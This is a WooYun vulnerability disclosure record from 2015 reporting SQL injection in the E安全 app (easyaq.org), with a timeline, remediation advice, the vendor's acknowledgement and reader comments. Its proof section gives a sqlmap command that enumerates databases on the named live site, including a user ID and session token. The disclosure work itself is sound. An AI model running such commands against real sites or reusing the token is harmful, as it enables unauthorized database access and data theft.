{"id": 71207, "wybug_id": "wooyun-2015-0144984", "wybug_title": "E安全APP存在SQL注入漏洞可读取用户密码等", "wybug_corp": "easyaq.org", "wybug_author": "刘大硕", "wybug_date": "2015-10-08 12:57", "wybug_open_date": "2015-11-22 13:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "数据库账户权限过高", "注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： E安全APP 在POST数据未进行传参过滤，导致存在SQL注入漏洞。权限ROOT 详细说明：  E安全APP 在POST数据未进行传参过滤，导致存在SQL注入漏洞。权限ROOT   漏洞证明：  \nsqlmap.py -u \"http://www.easyaq.org/video/myVideoList?videotypeid=0&coursename=&limit=20&newUpdateTime=0&oldUpdateTime=0&memberId=a551a5b9-dd8e-4906-ab92-37a4a51f86cc&token=b090e31e2bafac3689616d53f0efcd941ba88e5dc4097ef2a5aeb5a5438d864c&type=1&version=2.3.1\" --dbs --level 3\n\n\n\n\n\n\n\n\n   修复方案：  方法一：运用存储过程，存储过程对传入的参数要进行类型匹配,不合法的参数是不被执行的，传入参数个数的匹配。CallableStatement 调用；方法二：使用参数化查询；方法三：使用正则表达式；方法四：字符串过滤；方法五：不安全字符屏蔽。   版权声明：转载请注明来源 刘大硕@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-08 13:03 厂商回复： 谢谢刘兄国庆假期侠义出手帮助E安全发现了不足之处，我们6日下午获知此漏洞后已安排研发工程师进行整改，并准备发布新的版本，届时如果您还有时间还请帮忙再看看有没有新的漏洞。再次感谢刘兄的鞭策，这是我们的大辛事。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-06 15:05 |    \t\t背影 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:4        )\t\t \n  @猪哥靓     \n     2015-10-07 12:59 |    \t\tzeracker  \t\t\t( 普通白帽子  |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  厂商转给安恒就好了嘛 @疯狗    \n     2015-10-07 15:14 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1284 漏洞数:327        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  是登录处吗    \n     2015-10-08 10:07 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:53        | 微信公众号：233sec  不定期分享各种漏洞思...)\t\t \n  应该是登录处吧？    \n     2015-10-08 10:10 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  诸葛亮怎么办？会不会受到批评？    \n     2015-10-08 13:15 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:259 漏洞数:19        | 当我又回首一切,这个世界会好吗?)\t\t \n  大辛事    \n     2015-10-08 13:16 |    \t\t暖暖 \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:5        | 高三猫)\t\t \n  厂商好评    \n     2015-10-08 13:18 |    \t\t猪哥靓 \t\t\t( 普通白帽子  |\t\t\t        Rank:414 漏洞数:51        | 他们又懂我在想什么吗？我又懂他们在想什么...)\t\t \n  @sql小神 今天猪飞了，肉没了。晚上开始吃素了    \n     2015-10-08 13:21 |    \t\tyeweit6 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | 豫章故郡，洪都新府。星分翼轸，地接衡庐。...)\t\t \n  好事，减肥了    \n     2015-10-08 14:52 |    \t\tsql小神 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:4        | 有些漏洞可以提，有些漏洞不可以提。)\t\t \n  @猪哥靓 没事吧，没有核心业务，怕什么，就是一些视频，难道不是？    \n     2015-10-08 19:38 |    \t\t猪哥靓 \t\t\t( 普通白帽子  |\t\t\t        Rank:414 漏洞数:51        | 他们又懂我在想什么吗？我又懂他们在想什么...)\t\t \n  @sql小神 是的，95%都是第三方QQ，微博之类登录的。安全无小事，值得我们面壁反思与改进！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}